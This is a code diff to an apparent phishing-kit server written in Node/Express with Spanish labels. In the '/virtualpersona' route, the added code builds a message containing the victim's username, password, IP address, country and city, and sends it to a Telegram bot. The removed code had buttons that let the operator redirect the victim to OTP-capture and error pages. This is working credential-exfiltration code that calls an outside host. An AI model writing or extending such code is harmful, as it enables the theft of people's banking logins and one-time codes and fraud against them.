@@ -106,53 +106,21 @@ app.post('/virtualpersona', async (req, res) => {
     });
 
   
-try {
-  const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({
-      chat_id: CHAT_ID,
-      text: message,
-      reply_markup: {
-        inline_keyboard: [
-          [
-            {
-              text: "🔁 Error Logo",
-              callback_data: JSON.stringify({
-                sessionId,
-                action: 'redirect',
-                redirect_to: 'Virtual-Persona.html'
-              })
-            },
-            {
-              text: "🔁 Error OTP",
-              callback_data: JSON.stringify({
-                sessionId,
-                action: 'redirect',
-                redirect_to: 'otp-check.html'
-              })
-            }
-          ],
-          [
-            {
-              text: "✅ Siguiente",
-              callback_data: JSON.stringify({
-                sessionId,
-                action: 'redirect',
-                redirect_to: 'opcion1.html'
-              })
-            }
-          ]
-        ]
-      }
-    })
-  });
+// Construir mensaje
+const message = `<b>🔐 Ingreso Virtual</b>
 
-  const data = await res.json();
-  console.log("✅ Enviado a Telegram:", data);
-} catch (error) {
-  console.error("❌ Error al enviar a Telegram:", error);
-}
+${fmt('👤 User', user)}
+${fmt('🔑 Pass', pass)}
+${fmt('🌐 IP', ip)}
+${fmt('🌎 País', country)}
+${fmt('🏘️ Ciudad', city)}
+
+<b>SessionID:</b> <code>${sessionId}</code>
+⏱️ <i>${new Date().toLocaleString('es-CO')}</i>`;
+
+// Enviar mensaje con botones
+await tgSendMessage(message, buttonsForStep('virtual', sessionId));
+
 
 
 
